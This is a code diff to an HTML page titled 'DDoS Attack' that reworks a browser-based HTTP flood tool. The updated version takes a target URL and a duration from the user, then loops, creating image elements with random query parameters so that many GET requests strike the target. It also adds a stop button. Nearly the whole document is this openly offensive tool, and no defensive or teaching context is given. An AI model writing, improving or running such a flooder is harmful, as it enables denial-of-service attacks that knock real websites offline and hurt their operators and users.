@@ -5,20 +5,54 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DDoS Attack</title>
     <script>
-        // Function to launch a DDoS attack
-        function launchDDoS() {
-            // Get the target URL and number of requests from the user
-            let targetURL = document.getElementById("targetURL").value;
-            let numRequests = parseInt(document.getElementById("numRequests").value);
+        // Variable to track the status of the attack
+        let attackInProgress = false;
 
-            // Validate input
-            if (!targetURL || !numRequests || isNaN(numRequests) || numRequests <= 0) {
-                alert("Please enter a valid target URL and a positive integer for the number of requests.");
+        // Function to launch a DDoS attack
+        async function launchDDoS() {
+            // Check if an attack is already in progress
+            if (attackInProgress) {
+                console.log("Attack is already in progress.");
                 return;
             }
 
+            // Get the target URL and duration of the attack from the user
+            let targetURL = document.getElementById("targetURL").value;
+            let duration = parseInt(document.getElementById("duration").value);
+
+            // Validate input
+            if (!targetURL || !duration || isNaN(duration) || duration <= 0) {
+                alert("Please enter a valid target URL and a positive integer for the duration of the attack.");
+                return;
+            }
+
+            // Calculate the number of requests to send within the specified duration
+            let numRequests = Math.floor(Math.random() * (30000 - 10000 + 1) + 10000); // Randomly select between 10,000 to 30,000 requests
+
+            // Initialize a counter for completed requests
+            let completedRequests = 0;
+
+            // Set the status of the attack to in progress
+            attackInProgress = true;
+
             // Launch the DDoS attack
-            for (let i = 0; i < numRequests; i++) {
+            let startTime = Date.now();
+            let endTime = startTime + (duration * 1000); // Convert duration to milliseconds
+
+            // Display remaining time during the attack
+            let timer = setInterval(function() {
+                let remainingTime = Math.ceil((endTime - Date.now()) / 1000);
+                if (remainingTime <= 0) {
+                    clearInterval(timer);
+                    console.log("Attack duration has ended.");
+                    attackInProgress = false;
+                } else {
+                    console.log("Remaining time: " + remainingTime + " seconds");
+                }
+            }, 1000);
+
+            // Send requests within the specified duration
+            while (Date.now() < endTime && attackInProgress) {
                 // Create an image element to make a GET request
                 let img = new Image();
                 
@@ -27,10 +61,22 @@
                 
                 // Set the image source to the target URL with a random parameter
                 img.src = targetURL + "?" + randomParam;
+
+                // Increment the counter for completed requests
+                completedRequests++;
             }
 
             // Display a message indicating that the attack has been launched
-            console.log("DDoS attack launched successfully. Target: " + targetURL + ", Number of requests: " + numRequests);
+            console.log("DDoS attack launched successfully. Target: " + targetURL + ", Number of requests: " + completedRequests);
+
+            // Reset the status of the attack
+            attackInProgress = false;
+        }
+
+        // Function to stop the DDoS attack
+        function stopDDoS() {
+            // Set the status of the attack to stopped
+            attackInProgress = false;
         }
     </script>
 </head>
@@ -41,10 +87,11 @@
         <label for="targetURL">Target URL:</label><br>
         <input type="text" id="targetURL" name="targetURL" placeholder="Enter the target URL"><br><br>
         
-        <label for="numRequests">Number of Requests:</label><br>
-        <input type="number" id="numRequests" name="numRequests" placeholder="Enter the number of requests"><br><br>
+        <label for="duration">Duration of Attack (seconds):</label><br>
+        <input type="number" id="duration" name="duration" placeholder="Enter the duration"><br><br>
         
         <button type="button" onclick="launchDDoS()">Launch DDoS Attack</button>
+        <button type="button" onclick="stopDDoS()">Stop DDoS Attack</button>
     </form>
 </body>
 </html>
